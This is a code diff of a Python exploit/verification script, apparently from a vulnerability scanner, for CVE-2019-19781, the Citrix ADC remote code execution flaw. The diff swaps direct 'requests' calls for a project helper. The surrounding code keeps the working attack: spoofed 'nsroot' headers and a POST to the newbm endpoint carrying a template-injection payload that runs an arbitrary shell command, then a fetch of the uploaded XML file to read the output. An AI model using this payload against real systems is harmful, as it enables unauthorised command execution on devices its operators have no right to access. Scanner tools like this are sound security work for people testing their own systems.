@@ -6,9 +6,7 @@ description:  Citrix ADC远程代码执行漏洞,可执行任意命令
 '''
 
 import uuid
-import requests
-import requests.packages.urllib3
-requests.packages.urllib3.disable_warnings()
+from app.lib.utils.request import request
 
 class CVE_2019_19781_BaseVerify:
     def __init__(self, url):
@@ -23,7 +21,7 @@ class CVE_2019_19781_BaseVerify:
             'NSC_USER': 'nsroot',
             'NSC_NONCE': 'nsroot'
         }
-        req = requests.get(xml_url, headers = headers, verify = False)
+        req = request.get(xml_url, headers = headers)
         if req.status_code == 200:
             print('Xml_Url=', xml_url)
             print('Command=', cmd)
@@ -41,7 +39,7 @@ class CVE_2019_19781_BaseVerify:
                 'NSC_NONCE': 'nsroot'
             }
             payload = "url=http://example.com&title=" + self.cdl + "&desc=[% template.new('BLOCK' = 'print `"+ self.cmd + "`') %]"
-            req = requests.post(url = newbm_url, headers = headers, data = payload, verify = False, allow_redirects = False)
+            req = request.post(url = newbm_url, headers = headers, data = payload)
             if req.status_code == 200 and 'parent.window.ns_reload' in req.content:
                 print('存在CVE-2019-19781漏洞,上传的文件为:', newbm_url)
                 self.xml_url(url,cdl,cmd)
